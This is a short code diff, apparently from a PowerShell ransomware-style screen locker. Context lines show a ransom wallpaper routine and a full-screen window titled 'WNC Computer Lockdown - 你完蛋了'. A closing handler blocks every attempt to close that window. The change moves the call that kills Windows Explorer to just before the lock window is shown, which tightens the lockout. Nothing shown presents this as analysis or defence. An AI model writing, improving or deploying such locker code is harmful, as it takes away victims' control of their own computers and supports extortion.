@@ -402,7 +402,7 @@ Set-RansomWallpaper
 # Get files for display
 $systemFiles = Get-SystemFiles
 
-Kill-Explorer
+
 
 $w = New-Object System.Windows.Window
 $w.Title = "WNC Computer Lockdown - 你完蛋了"
@@ -921,5 +921,7 @@ $w.Add_LocationChanged({
 $w.Content = $g
 
 $w.Add_Closing({ param($s,$e) $e.Cancel = $true })
+
+Kill-Explorer
 
 $null = $w.ShowDialog()
